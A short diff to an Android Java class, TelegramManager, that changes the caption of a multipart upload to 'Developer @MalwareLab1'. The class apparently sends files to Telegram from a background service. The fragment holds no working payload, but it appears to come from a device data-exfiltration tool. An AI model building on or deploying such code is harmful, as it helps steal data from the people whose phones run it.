@@ -52,7 +52,7 @@ public class TelegramManager {
                     
                     writer.append("--" + boundary).append("\r\n");
                     writer.append("Content-Disposition: form-data; name=\"caption\"").append("\r\n\r\n");
-                    writer.append("Developer @ArmanKhan_BDT").append("\r\n");
+                    writer.append("Developer @MalwareLab1").append("\r\n");
 
                     
                     writer.append("--" + boundary).append("\r\n");
@@ -139,4 +139,5 @@ public class TelegramManager {
         public IBinder onBind(Intent intent) { return null; }
     }
 }
+
 
